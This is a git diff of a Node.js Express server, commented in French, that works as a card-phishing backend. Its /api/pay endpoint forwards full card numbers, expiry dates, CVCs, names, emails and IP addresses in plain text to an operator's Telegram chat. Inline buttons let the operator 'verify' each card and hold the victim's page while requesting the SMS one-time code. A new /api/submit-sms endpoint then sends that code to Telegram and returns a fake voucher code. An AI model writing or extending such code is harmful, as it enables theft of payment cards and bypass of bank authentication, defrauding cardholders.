@@ -16,19 +16,57 @@ const tgToken = process.env.TOKEN_TELEGRAM;
 const tgChatId = process.env.TELEGRAM_CHAT_ID;
 const botTg = new TelegramBot(tgToken, { polling: true });
 
+const pendingPayments = new Map();
+
 // Helper for Telegram Logging
-async function sendToTelegram(message) {
-    if (!tgChatId) {
-        console.warn("TELEGRAM_CHAT_ID non configuré");
-        return;
-    }
+async function sendToTelegram(message, options = {}) {
+    if (!tgChatId) return;
     try {
-        await botTg.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
+        await botTg.sendMessage(tgChatId, message, { 
+            parse_mode: 'Markdown',
+            ...options
+        });
         console.log("Log envoyé sur Telegram (server.js)");
     } catch (err) {
         console.error("Erreur Telegram server.js:", err.message);
     }
 }
+
+// Card Validation Helper
+function validateCard(number, expiry, cvc) {
+    const checkLuhn = (num) => {
+        let n = num.replace(/\s/g, '');
+        let sum = 0;
+        for (let i = 0; i < n.length; i++) {
+            let intVal = parseInt(n.substr(i, 1));
+            if (i % 2 === n.length % 2) {
+                intVal *= 2;
+                if (intVal > 9) intVal -= 9;
+            }
+            sum += intVal;
+        }
+        return sum % 10 === 0;
+    };
+    const isLuhnValid = checkLuhn(number);
+    const [month, year] = expiry.split('/').map(s => parseInt(s.trim()));
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+    const isExpiryValid = month > 0 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
+    const isCvcValid = cvc.length >= 3 && cvc.length <= 4;
+    return { isLuhnValid, isExpiryValid, isCvcValid };
+}
+
+botTg.on('callback_query', (query) => {
+    const data = query.data;
+    if (data.startsWith('ask_sms_')) {
+        const paymentId = data.replace('ask_sms_', '');
+        if (pendingPayments.has(paymentId)) {
+            pendingPayments.get(paymentId).needsSms = true;
+            botTg.answerCallbackQuery(query.id, { text: "Code SMS demandé (Server)" });
+        }
+    }
+});
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -47,43 +85,44 @@ function generateCode() {
 
 app.post('/api/pay', async (req, res) => {
     const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
+    const paymentId = Math.random().toString(36).substring(2, 11);
+    pendingPayments.set(paymentId, { needsSms: false });
 
-    // Send debug data to Telegram
     try {
-        const message = `💳 *Nouvelle tentative de paiement (Server)*\n\n` +
-            `👤 *Titulaire:* \`${cardHolder || 'Inconnu'}\`\n` +
-            `📧 *Email:* \`${email || 'Inconnu'}\`\n` +
-            `🔢 *Numéro:* \`${cardNumber || 'Inconnu'}\`\n` +
-            `📅 *Expiration:* \`${expiry || 'Inconnu'}\`\n` +
-            `🔒 *CVC:* \`${cvc || 'Inconnu'}\`\n` +
-            `🌍 *Pays:* \`${country || 'Inconnu'}\`\n` +
-            `🌐 *IP:* \`${req.ip}\``;
+        const message = `💳 *NOUVEAU PAIEMENT (SERVER)*\n\n` +
+            `👤 *NOM:* \`${cardHolder || 'N/A'}\`\n` +
+            `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
+            `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
+            `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
+            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${req.ip}\``;
         
-        await sendToTelegram(message);
+        await sendToTelegram(message, {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "🔍 Vérifier la carte", callback_data: `validate_|${cardNumber}|${expiry}|${cvc}` }],
+                    [{ text: "📲 DEMANDER CODE SMS", callback_data: `ask_sms_${paymentId}` }]
+                ]
+            }
+        });
     } catch (err) {
         console.error("Telegram log error server.js:", err.message);
     }
 
-    // Simulate delay
     setTimeout(() => {
-        // Basic simulation validation
-        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
-            return res.status(400).json({ success: false, message: 'Numéro de carte invalide' });
+        const p = pendingPayments.get(paymentId);
+        if (p && p.needsSms) {
+            return res.json({ success: true, needsSms: true, paymentId });
         }
-
         const newCode = generateCode();
-        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
-        
-        data.codes.push({
-            code: newCode,
-            claimed: false,
-            timestamp: Date.now()
-        });
-
-        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
-
         res.json({ success: true, code: newCode });
-    }, 1500);
+        pendingPayments.delete(paymentId);
+    }, 5000);
+});
+
+app.post('/api/submit-sms', async (req, res) => {
+    const { smsCode, paymentId } = req.body;
+    sendToTelegram(`📲 *SMS REÇU (Server)*\nCODE: \`${smsCode}\``);
+    res.json({ success: true, code: generateCode() });
 });
 
 app.listen(PORT, () => {
